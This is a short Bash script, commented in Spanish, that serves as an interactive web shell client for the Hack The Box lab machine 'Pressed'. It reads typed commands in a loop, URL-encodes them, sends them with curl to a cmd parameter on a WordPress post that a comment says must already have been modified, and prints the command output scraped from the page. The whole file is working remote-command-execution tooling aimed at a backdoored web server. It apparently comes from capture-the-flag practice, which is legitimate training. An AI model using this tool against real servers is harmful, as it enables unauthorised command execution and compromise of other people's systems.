#!/bin/bash

#WebShell para la mÃ¡quina Pressed de Hack The Box 
#(Peviamente se debe de haber modificado el post hello-world)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#URL
url="http://10.10.11.142/index.php/2022/01/28/hello-world/?cmd="
#Trapping Ctrl+c
sigint() {
  echo -e '\n [*] Saliendo de la webShell'
  exit 1
}
trap sigint INT

while :
do
	echo -ne "${redColour}$>${endColour} "
	read -r command
	command="$(echo "$command 2>%261" | tr ' ' '+')"
	echo -e "${greenColour}$(curl -s $url$command | grep -zoP '(?<=<pre>)(?s).*(?=</pre>)')${endColour}"
done
